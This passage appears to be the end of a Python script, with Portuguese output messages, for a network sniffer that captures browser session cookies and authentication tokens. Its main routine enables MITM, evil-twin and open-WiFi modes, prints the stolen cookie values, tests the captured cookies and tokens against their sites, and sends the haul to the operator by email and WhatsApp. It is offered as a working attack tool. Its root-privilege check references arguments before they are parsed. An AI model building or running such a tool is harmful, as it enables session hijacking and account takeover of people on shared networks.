    if args.auto_ports:
        args.filters = "tcp port 80 or tcp port 443"
    if args.open_wifi:
        args.filters = "tcp port 80 or tcp port 443"
        args.low_latency = True
    interfaces = args.interfaces or ",".join(config["interfaces"])
    filters = args.filters or ",".join(config["filters"])
    cookies, tokens = sniff_packets(
        interfaces, filters, args.max_packets, args.timeout, args.output_dir, args.domain_filter,
        args.http_method, args.cookie_type, args.ip_filter, args.header_filter, args.continuous,
        args.pcap, args.mitm, args.dry_run, args.wireshark_live, args.xss_detect, args.domain_validate,
        args.token_capture, args.websocket, args.evil_twin
    )
    if not args.silent:
        print("\n\033[1;97m=== Cookies Capturados ===")
        if cookies:
            for cookie in cookies:
                print(f"\033[1;92m{cookie['timestamp']} | {cookie['domain']} | {cookie['name']}={cookie['value']}")
        else:
            print("\033[1;91mNenhum cookie capturado.")
        print("\n\033[1;97m=== Tokens Capturados ===")
        if tokens:
            for token in tokens:
                print(f"\033[1;92m{token['timestamp']} | Token: {token['token']} | URL: {token['url']}")
        else:
            print("\033[1;91mNenhum token capturado.")
        report = generate_report(cookies, args.output_dir)
        generate_graph(cookies, args.output_dir)
        if args.audit:
            audit_report = audit_cookies(cookies, args.output_dir)
            print(f"\033[1;97mAuditoria: {json.dumps(audit_report, indent=4)}")
        print(f"\033[1;97mRelatório: {json.dumps(report, indent=4)}")
    if args.test_cookies:
        test_results = test_cookies(cookies, args.output_dir)
        if not args.silent:
            print(f"\033[1;97mTeste de Cookies: {json.dumps(test_results, indent=4)}")
    if args.test_tokens:
        token_results = test_tokens(tokens, args.output_dir)
        if not args.silent:
            print(f"\033[1;97mTeste de Tokens: {json.dumps(token_results, indent=4)}")
    if args.email:
        send_email(cookies, args.email, config, args.output_dir)
    if args.whatsapp:
        send_whatsapp(cookies, args.whatsapp, config, args.output_dir)
    if not args.silent:
        print(f"\033[1;97mResultados salvos em {args.output_dir}/cookies.json, cookies.csv, cookies.txt, browser_cookies.json, cookies.db, cookies.jsonl, cookies_graph.png, audit_report.json")

if __name__ == "__main__":
    if not os.geteuid() == 0 and not args.dry_run:
        print("\033[1;91m[ERRO] Este script requer privilégios de root (use sudo).")
        sys.exit(1)
    args = setup_argparse()
    if args.gui:
        main_gui(args)
    else:
        main(args)